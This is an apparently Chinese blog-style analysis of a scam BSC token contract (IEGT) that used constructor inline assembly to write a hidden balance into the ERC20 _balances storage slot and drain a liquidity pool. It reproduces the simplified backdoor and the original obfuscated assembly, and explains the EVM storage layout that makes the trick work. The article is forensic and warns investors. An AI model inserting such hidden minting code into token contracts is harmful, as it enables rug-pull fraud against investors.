## 内联汇编 修改内存插槽slot
* https://www.bilibili.com/video/BV1GM4y1W7pq/
----
7月26日12点43分，在币安智能链 BSC 上，有一个欺诈合约通过修改数据插槽 slot 的方式，增发了天量代币，将池子中的资金全部卷走，共获利 114万 USDT，合人民币820万。

交易的哈希： `0x8d07f605926837ea0f9e1e24dba0fb348cb3e97d`，可以到 BSC 区块浏览器详细查看。

从区块浏览器的数据来看，这个合约的表现非常诡异。在项目代币没有增发记录的情况下，合约部署者大量增发了代币，卷走了池子里面的资金。

通过区块浏览器观察 Holders，这个合约发行的代币，符号为 IEGT，合约记录的发行总量为 totalSupply 为500万。但是，在 **dead** 和 **pair` 地址中的代币总量，却远远不止 500 万。

![image](https://github.com/NinjaGPT/crypto/assets/4035112/d64e8e6f-95df-41a7-afe4-a6bcd5a7ec32)

那么凭空多出来的代币从何而来呢，为什么没有被区块浏览器统计呢。进一步追查这些代币的来源时可以发现，有一个地址的交易非常蹊跷，它只有转出记录而没有转入记录。

众所周知，ERC20 合约标准规定了代币铸造和转移时，必须实现 Transfer 事件。区块浏览器需要依赖这些事件记录进行数据统计。所以，当在区块浏览器中发现代币总额与实际数量不符合时，就说明代币在进行增发时没有记录事件。

这个欺诈合约的代码是开源的，查看这个合约 Transfer 函数，发现它的这段函数代码并没有问题，确实记录了 Transfer 事件。这说明，它没有按照正规流程增发代币，而是绕过 mint 函数，直接修改了特定地址的代币余额。

再次查看这个合约的源码，终于发现了恶意代码的位置和欺诈的手法。就是这段代码偷偷修改了特定地址的余额，凭空给这个特定地址产生了巨量代币。

简化了这个合约，并依据它的欺诈方法，复原了这个欺诈过程。简化合约的核心代码为：

```solidity
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TokenIEGT is ERC20 {
    // 构造函数
    constructor() ERC20("IEGT","IEGT") {
        _pathSet(); // 调用恶意代码
    }

    // 恶意代码
    function _pathSet() private {
        assembly {
            let y := 0x17F6AD8Ef982297579C203069C1DbfFE4348c372  //scamer's address

            mstore(0, y)
            mstore(32, 0)
            
            sstore(keccak256(0, 64), 666) 
        }      
     }
}
```
这个合约继承了标准的 ERC20 合约。构造函数中发布的代币的名称和符号都是 IEGT。

然后在构造函数中调用了一个私有函数 _pathSet，这个函数 _pathSet`** 内部是一段内联汇编代码。这段汇编代码就4句，比较简单。 

可以把完整代码复制到 Remix 里，查看效果, 查看它的发行总量，点击 totalSupply，结果是 0。这是因为并没有在代码中铸造，也就是没有调用 mint 函数。

再看看代码中的这个地址：0x17F6AD8Ef982297579C203069C1DbfFE4348c372，调用 balanceOf 函数，它的余额竟然有 666 wei。

这些代币从哪里来的呢？其实就是合约中的函数 _pathSet 偷偷发行的。它给这个地址发行了 666 wei 代币。

----

### 状态变量的存储
----
要看懂这段代码，就先要学习一下合约变量的存储知识。首先说一下状态变量的存储。

状态变量是合约中声明的永久存储的数据，而存储插槽是用于存储这些状态变量的物理位置，存储插槽的英文名称为 slot 。每个状态变量都会被映射到一个存储插槽上，而存储插槽的大小为 32 个字节，这是EVM中定义的插槽标准大小。

![image](https://github.com/NinjaGPT/crypto/assets/4035112/7e5718bd-fa27-4989-a08e-393699d89ecd)

在 `Solidity` 中声明一个状态变量时，例如 `uint256 a` ，这个变量` a `会被存储在一个存储插槽上

`Solidity` 编译器会根据变量的类型和声明顺序，决定将状态变量存储在哪个插槽上，以及如何访问这些数据

插槽编号是从 0 开始的，按照状态变量的声明顺序依次分配。例如，第一个状态变量将存储在插槽 0 上，第二个状态变量将存储在插槽 1 上，以此类推。实际上，插槽的使用规则更复杂一点，长度小于32个字节的多个状态变量，

可能会合并到一个插槽中。如果状态变量是复合类型，则它们可能会占用多个插槽  

我们可以使用内联汇编的 `sload` 和 `sstore` 指令来读取和写入存储插槽的数据。

----

### 内存变量的存储
----
内存变量，顾名思义，它的数据是存放在内存中。`EVM` 执行一个合约时，都会为它专门分配一块内存，内存变量的内容就存放在这块内存中。一旦调用合约的函数执行结束，这块分配的内存就会释放。所以，内存变量也就随之消失了。

![image](https://github.com/NinjaGPT/crypto/assets/4035112/e800e06b-e8b2-4de6-b264-356188257126)

在 `Solidity` 的内联汇编语言中，`mload` 和 `mstore`是用于读取和写入内存变量的指令。这两条指令操作的内存大小也都是固定的 32 个字节。

----

### 简化代码分析
----
有了上面的知识，我们来分析一下这段代码：
```solidity
contract TokenIEGT is ERC20 {
    // 构造函数
    constructor() ERC20("IEGT","IEGT") {
        _pathSet(); // 调用恶意代码
    }

    // 恶意代码
    function _pathSet() private {
        assembly {
            let y := 0x17F6AD8Ef982297579C203069C1DbfFE4348c372

            mstore(0, y)
            mstore(32, 0)
            
            sstore(keccak256(0, 64), 666) 
        }      
     }
}
```
第一句：给变量 y ，赋值了一个地址。

第二句：`mstore(0,y)` 的意思是将数值 `y` 存储到内存位置为 0 的地方，占据 32 个字节。其实就是把地址 `0x17F6AD8Ef982297579C203069C1DbfFE4348c372` 写进去，不足的位置都补 0。

第三句：`mstore(32, 0)` 的意思是将数值 0 存储到内存位置为 32 个字节的地方，占据 32 个字节。也就是内存中从 32 字节开始，写入 32 个字节的 0。

第四句：`sstore` 这句代码的意思是将数值 666 写到一个特定位置的插槽中。这个特定位置是通过 `keccak256(0, 64)` 计算得到的。`keccak256(0, 64)` 是计算了内存中从 0 到 64 字节的数据的哈希值。内存中从 0 到 64 字节的数据，其实就是第二句和第三句写入内存的数据合并在一起。它的内容是：

```solidity
00000000000000000000000017F6AD8Ef982297579C203069C1DbfFE4348c372
0000000000000000000000000000000000000000000000000000000000000000
```

它的长度是64个字节。也就是对这个 64 字节数据进行哈希，得到的结果值作为存储位置，将 666 存进去。

问题其实就出在这个语句上。`keccak256` 语句计算出来的插槽位置，其实就是合约中状态变量 `_balances` 里的一个数据存储位置。

`_balances` 是在它的 父合约 中定义的变量，是一个 `mapping` 类型的数据。因为继承关系，当前合约也拥有了这个变量 `_balances` 。

`_balances` 就是 ERC20 代币合约中存放所有地址余额的变量。你只要修改了这里面的数据，那么对应的地址里代币的余额就修改了。

`_balances` 是一个状态变量，也就是说，它的数据存储在插槽里。由于它在合约里定义的位置在最前面，所以它被存储在第一个插槽 slot 0。

`mapping` 里存储的键值对是动态的，它可以有任意多个。它们并不跟 `mapping` 存放在一起，而是要通过 `keccak256` 计算，来决定到底该存放到哪一个位置。

计算公式就是 `keccak256(address . slot)`，其中 `address.slot` ，是指把 `address` 和槽位拼接在一起。

比如 `_balances` 槽位 `slot` 等于 0，`address` 是 `0x17F6AD8Ef982297579C203069C1DbfFE4348c372`。

那么，`keccak256(address . slot)`，实际上就是 `_balances[0x17F6AD8Ef982297579C203069C1DbfFE4348c372]` 的数据存储位置。

如果我们向这个位置写入 666，那么就意味着 `0x17F6AD8Ef982297579C203069C1DbfFE4348c372` 这个地址拥有了 666 Wei个代币。

我们再看看内联汇编中的第4条语句。`keccak256(0, 64)` 实际上就是 `keccak256(address.slot)`，就等价于 `_balances[0x17F6AD8Ef982297579C203069C1DbfFE4348c372]` 的存储位置。

所以，整个的内联汇编语句，其实就是一句 Solitity 语句:

```solidity
_balances[0x17F6AD8Ef982297579C203069C1DbfFE4348c372] = 666
```

也就是说，在部署合约的时候，就给 `0x17F6AD8Ef982297579C203069C1DbfFE4348c372` 凭空创造了 **666 Wei*** 个代币。

----

### 原始代码分析
----
明白了这些，就很容易理解欺诈合约的手段了。它的恶意代码就是在这个 _pathSet 函数中。它故意没对代码进行格式化处理，看起来比较乱，就是为了迷惑投资者。

![image](https://github.com/NinjaGPT/crypto/assets/4035112/93b91638-25f6-4c76-9459-67b96ffd1646)


其实，其它代码都是保护这段内容设置的。我们把它美化一下：
```solidity
 //......
        assembly {
            let y := add(add(mul(379858174470926,exp(10,28)),mul(61835533555714,exp(10,14))),74433453022038) 

            mstore(0, y) 
            mstore(32, 0x0) 

            sstore(keccak256(0, 64), exp(timestamp(), 6))
             
            //...... 
        }
  //......
```
这是不是跟我的代码结构是一模一样。它的变量 y ，为了不让人发现是个地址，故意拆解成多个数相加，其实加在一起，就是合约创建者自己控制的一个地址，也就是用来掏空池子的地址。合约在部署的时候，凭空为它铸造了巨量代币。

`sstore` 函数中，这个数量是用当前区块的时间戳，进行了 6 次方运算，这就是那个巨大的代币数量。

这个土狗合约就是利用了修改插槽数据的方式进行欺诈，投资者损失了接近上千万元。当然，这个合约的编写者应该是一个 `Solidity` 高手，对合约的内存操作研究得非常深入，这也是他得手的主要原因。所以，对于土狗合约中，出现了内联汇编语句的话，我们千万不要贸然投资。

其实，大多数合约根本用不到内联汇编，事出反常必有妖。除非在有些特殊场景下，出于节省 gas 费的目的，才会使用内联汇编。
